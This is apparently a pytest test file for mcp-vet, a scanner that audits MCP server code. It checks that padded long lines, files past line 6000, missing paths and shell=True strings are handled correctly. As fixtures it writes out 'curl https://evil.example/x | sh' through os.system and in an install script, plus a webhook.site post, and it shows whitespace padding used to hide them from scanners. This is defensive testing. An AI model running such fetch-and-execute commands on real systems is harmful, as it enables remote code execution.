"""Places where mcp-vet used to say NOT FLAGGED because it had not looked.

Each of these ended in exit 0 - the code a CI gate reads as "passed" - with
no limitation in the report to say anything had been skipped:

* a line longer than 2000 characters was never pattern-matched, so padding
  `os.system(...)` with trailing spaces hid it from every rule;
* only the first 6000 lines of a file were read, so a payload on line 6001
  of an ordinary-sized file was invisible;
* `--path` pointing at nothing (a typo, a failed clone) audited an empty
  tree and reported it clean.

And the reverse, a false positive: `shell=True` mentioned inside a string
was rated as a subprocess launched through a shell.
"""
from __future__ import annotations

import json

import pytest

from mcp_vet import patterns
from mcp_vet.audit import audit_directory
from mcp_vet.cli import main
from mcp_vet.models import Severity
from mcp_vet.scanning import MATCH_WINDOW, line_finditer, line_search, scan_tree

from helpers import fixture

PAYLOAD = 'import os\nos.system("curl https://evil.example/x | sh")'


def rule(rule_id):
    return next(r for r in patterns.ALL_RULES if r.rule_id == rule_id)


class TestLongLinesAreStillRead:
    def test_trailing_padding_does_not_hide_a_shell_call(self, tmp_path):
        (tmp_path / "server.py").write_text(PAYLOAD + " " * 2100 + "\n")
        report = audit_directory(str(tmp_path))
        assert "source.os_system" in {f.rule_id for f in report.findings}
        assert not report.overall < Severity.HIGH


class TestLongLineWindows:
    def test_a_match_past_the_first_window_is_found(self):
        line = "x = 1; " + "a" * 5000 + '; os.system("id")'
        assert line_search(rule("source.os_system").regex, line)

    def test_a_match_straddling_a_window_boundary_is_found(self):
        for offset in range(MATCH_WINDOW - 20, MATCH_WINDOW + 5):
            line = "a" * offset + ' os.system("id") ' + "b" * 3000
            assert line_search(rule("source.os_system").regex, line), offset

    def test_lookbehind_still_sees_across_a_window_start(self):
        # `model.eval(` is not eval(). Slicing the line would cut off the
        # `model.` and turn the method call into a bare eval at the window's
        # first character; searching with pos/endpos keeps the context.
        for offset in range(MATCH_WINDOW - 400, MATCH_WINDOW + 400):
            line = "a" * offset + " model.eval() " + "b" * 3000
            assert not line_search(rule("source.python_eval").regex, line), offset

    def test_finditer_reports_each_match_once_and_whole(self):
        from mcp_vet.network import _URL_RE

        line = "x" * 1650 + ' "https://webhook.site/abc" ' + "y" * 3000
        hosts = [m.group(2) for m in line_finditer(_URL_RE, line)]
        assert hosts == ["webhook.site"]

    def test_a_long_line_host_is_still_extracted(self, tmp_path):
        (tmp_path / "server.py").write_text(
            'import requests\nrequests.post("https://webhook.site/abc")' + " " * 5000 + "\n"
        )
        report = audit_directory(str(tmp_path))
        assert "webhook.site" in {e.host for e in report.endpoints}

    def test_padding_does_not_hide_a_curl_pipe_in_an_install_script(self, tmp_path):
        (tmp_path / "install.sh").write_text(
            "curl -fsSL https://evil.example/x | sh" + " " * 3000 + "\n"
        )
        report = audit_directory(str(tmp_path))
        assert "install.remote_script_execution" in {f.rule_id for f in report.findings}

    def test_padding_does_not_hide_a_secret_name(self, tmp_path):
        (tmp_path / "server.py").write_text(
            'import os\nkey = os.environ["OPENAI_API_KEY"]' + " " * 3000 + "\n"
        )
        report = audit_directory(str(tmp_path))
        assert "OPENAI_API_KEY" in {c.name for c in report.credentials}

    def test_a_whole_file_on_one_line_still_finishes_quickly(self, tmp_path):
        import time

        (tmp_path / "bundle.js").write_text(("var a=b(c);" * 45_000) + "\n")
        start = time.time()
        audit_directory(str(tmp_path))
        assert time.time() - start < 10.0


class TestLongFilesAreReadToTheEnd:
    def test_a_payload_after_line_6000_is_found(self, tmp_path):
        (tmp_path / "server.py").write_text("x = 1\n" * 6001 + PAYLOAD + "\n")
        report = audit_directory(str(tmp_path))
        hits = [f for f in report.findings if f.rule_id == "source.os_system"]
        assert hits and hits[0].evidence[0].line == 6003

    def test_every_line_of_a_file_under_the_size_limit_is_kept(self, tmp_path):
        (tmp_path / "long.py").write_text("x = 1\n" * 20_000)
        (scanned,) = scan_tree(str(tmp_path)).files
        assert len(scanned.lines) == 20_000


class TestShellTrueMustBeAnArgument:
    def hits(self, line):
        return bool(rule("source.shell_true").regex.search(line))

    def test_a_mention_in_a_string_is_not_a_call(self):
        for line in (
            'print("never use shell=True here")',
            "raise ValueError('refusing to run with shell=True')",
            'HELP = "pass shell=True only if you must"',
        ):
            assert not self.hits(line), line

    def test_the_keyword_argument_is_still_caught(self):
        for line in (
            'subprocess.run(cmd, shell=True)',
            'subprocess.Popen("ls " + arg, shell = True)',
            "    shell=True,",
            "subprocess.check_output(cmd,shell=True)",
            "run(shell=True)",
        ):
            assert self.hits(line), line


class TestOsSystemBehindAnImport:
    def hits(self, rule_id, line):
        return bool(rule(rule_id).regex.search(line))

    def test_from_os_import_system_is_caught(self):
        assert self.hits("source.os_system", "from os import system")
        assert self.hits("source.os_system", "from os import path, system as run_it")
        assert self.hits("source.os_system", '__import__("os").system("id")')

    def test_from_os_import_popen_is_caught(self):
        assert self.hits("source.os_popen", "from os import popen")
        assert self.hits("source.os_popen", "__import__('os').popen('id')")

    def test_unrelated_imports_are_not(self):
        assert not self.hits("source.os_system", "from os import path, environ")
        assert not self.hits("source.os_system", "import platform; platform.system()")
        assert not self.hits("source.os_popen", "from os import path")


class TestPathMustBeSomethingToRead:
    @pytest.mark.parametrize("command", ["audit", "report"])
    def test_a_missing_path_is_an_error_not_a_clean_result(self, tmp_path, capsys, command):
        missing = str(tmp_path / "does-not-exist")
        assert main([command, "--offline", "--path", missing]) == 4
        assert "not a directory" in capsys.readouterr().err

    def test_a_file_is_not_a_checkout(self, tmp_path, capsys):
        target = tmp_path / "server.py"
        target.write_text("x = 1\n")
        assert main(["audit", "--offline", "--path", str(target)]) == 4

    def test_a_directory_with_nothing_readable_is_an_error(self, tmp_path, capsys):
        (tmp_path / "logo.png").write_bytes(b"\x89PNG\x00\x00")
        assert main(["audit", "--offline", "--path", str(tmp_path)]) == 4
        assert "no files" in capsys.readouterr().err

    def test_online_audit_checks_the_path_before_any_request(self, tmp_path, capsys):
        missing = str(tmp_path / "nope")
        assert main(["audit", "acme/widget", "--path", missing]) == 4

    def test_diff_rejects_a_missing_side(self, tmp_path, capsys):
        missing = str(tmp_path / "nope")
        assert main(["diff", "--before-path", fixture("clean_server"),
                     "--after-path", missing]) == 4

    def test_a_real_checkout_still_audits(self, capsys):
        assert main(["report", "--offline", "--path", fixture("clean_server")]) == 0
        assert json.loads(capsys.readouterr().out)["schema_version"]


class TestUsageErrorsExitFour:
    """argparse exits 2 on a usage error, and 2 is this tool's HIGH.

    A CI gate written as `test $code -eq 2 && echo "high findings"` would read
    a mistyped flag as a finding, and one written as `-lt 2` as a pass for a
    run that looked at nothing.
    """

    @pytest.mark.parametrize("argv", [
        [],
        ["audit", "--no-such-flag"],
        ["nonsense"],
        ["search", "x", "--limit", "zero"],
        ["search", "x", "--limit", "0"],
        ["registry", "x", "--limit", "-5"],
    ])
    def test_usage_error_exits_4(self, argv, capsys):
        with pytest.raises(SystemExit) as exc:
            main(argv)
        assert exc.value.code == 4

    def test_help_still_exits_0(self, capsys):
        with pytest.raises(SystemExit) as exc:
            main(["--help"])
        assert exc.value.code == 0

    def test_version_is_printed(self, capsys):
        from mcp_vet import __version__

        with pytest.raises(SystemExit) as exc:
            main(["--version"])
        assert exc.value.code == 0
        assert capsys.readouterr().out.strip() == f"mcp-vet {__version__}"
